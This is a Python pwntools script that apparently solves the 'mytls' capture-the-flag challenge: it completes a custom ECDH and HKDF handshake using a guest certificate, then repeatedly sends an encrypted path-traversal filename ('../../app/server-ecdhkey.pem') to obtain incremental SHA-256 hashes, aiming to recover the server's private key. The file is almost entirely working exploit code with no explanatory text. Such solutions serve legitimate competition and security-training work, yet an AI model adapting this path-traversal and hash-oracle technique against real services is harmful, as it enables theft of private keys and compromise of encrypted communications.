import binascii
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import hmac
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import hashlib
import os
from secrets import token_hex
from pwn import *
import string

def msg_encrypt(message, iv, key):
	cipher = Cipher(algorithms.AES(key), modes.CBC(binascii.unhexlify(iv)))
	encryptor = cipher.encryptor()
	message = message.encode('utf-8')
	payload = encryptor.update(message + b'\x00' * (16 - len(message) % 16)) + encryptor.finalize()
	return binascii.hexlify(payload).decode('utf-8')

def msg_decrypt(message, iv, key):
	cipher = Cipher(algorithms.AES(key), modes.CBC(binascii.unhexlify(iv)))
	decryptor = cipher.decryptor()
	payload = message
	payload = binascii.unhexlify(payload)
	res = decryptor.update(payload)
	return res.strip(b'\x00')

context.log_level = 'error'
if sys.argv[1] == 'l':
	io = process(['python3', 'server.py'])
	with open('server-ecdhcert.pem', 'rb') as server_cert_file:
		server_cert_content = server_cert_file.read()
		server_cert = x509.load_pem_x509_certificate(server_cert_content)
else:
	io = remote('mytls.2023.ctfcompetition.com', 1337)
	with open('orig-server-ecdhcert.pem', 'rb') as server_cert_file:
		server_cert_content = server_cert_file.read()
		server_cert = x509.load_pem_x509_certificate(server_cert_content)

with open('guest-ecdhcert.pem', 'rb') as guest_cert_file:
	guest_cert_content = guest_cert_file.read()
	guest_cert = x509.load_pem_x509_certificate(guest_cert_content)

with open('guest-ecdhkey.pem', 'rb') as guest_key_file:
	guest_key = serialization.load_pem_private_key(guest_key_file.read(), None, default_backend())

# send guest cert
io.sendlineafter(b'client certificate in PEM format:\n', guest_cert_content)

# send ephemeral client random
client_ephemeral_random = 32 * 'a'
io.sendlineafter(b'ephemeral client random:\n', client_ephemeral_random.encode())

# send ephemeral client cert
client_ephemeral_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
client_ephemeral_key_pub = client_ephemeral_key.public_key()
io.sendlineafter(b'ephemeral client key:\n',
	client_ephemeral_key_pub.public_bytes(encoding=serialization.Encoding.PEM,
		format=serialization.PublicFormat.SubjectPublicKeyInfo))

# receive server ephemeral random
io.recvuntil(b'Server ephemeral random:\n')
server_ephemeral_random = io.recvlineS().strip()

# receive server ephemeral random
io.recvuntil(b'Server ephemeral key:\n')
server_ephemeral_key_content = io.recvuntil(b'-----END PUBLIC KEY-----')
server_ephemeral_public_key = serialization.load_pem_public_key(server_ephemeral_key_content)

# ecdh exchange for ephemeral secret
server_ephemeral_secret = client_ephemeral_key.exchange(ec.ECDH(), server_ephemeral_public_key)

# ecdh exchange for secret
server_secret = guest_key.exchange(ec.ECDH(), server_cert.public_key())

derived_key = HKDF(algorithm = hashes.SHA256(),
					length = 32,
					salt = b'SaltyMcSaltFace',
					info = b'mytls').derive(
						server_ephemeral_secret +
						server_secret +
						client_ephemeral_random.encode('utf-8') +
						server_ephemeral_random.encode('utf-8'))
# print(f'client: {derived_key=}')

# send hmac to the server
client_hmac = hmac.HMAC(derived_key, hashes.SHA256())
client_hmac.update(b'client myTLS successful!')
client_hmac_sent = binascii.hexlify(client_hmac.finalize())
io.sendlineafter(b'client HMAC:\n', client_hmac_sent)

# receive server hmac
io.recvuntil(b'Server HMAC:\n')
server_hmac = io.recvlineS().strip()
# print(f'{server_hmac=}')

# tls handshake done
# hello
msg = io.recvlineS().strip()

# poke hashes of the server key file incrementally
hashes_sha256 = []
c = '#'
for _ in range(356):
	# ignore the welcome message
	io.recvlineS().strip()

	# exploit path traversal
	msg = msg_encrypt('../../app/server-ecdhkey.pem', server_ephemeral_random, derived_key)
	io.sendline(msg.encode())

	# send the secrets
	msg = io.recvlineS().strip()
	secrecy = msg_encrypt(c, server_ephemeral_random, derived_key)
	io.sendline(secrecy.encode())
	c += '#'

	# receive the hash
	msg = io.recvlineS().strip()
	msg = msg_decrypt(msg, server_ephemeral_random, derived_key)
	h = msg[34:].decode()
	# print(f'{h=}')
	hashes_sha256.append(h)

io.close()
print(f'{hashes_sha256=}')
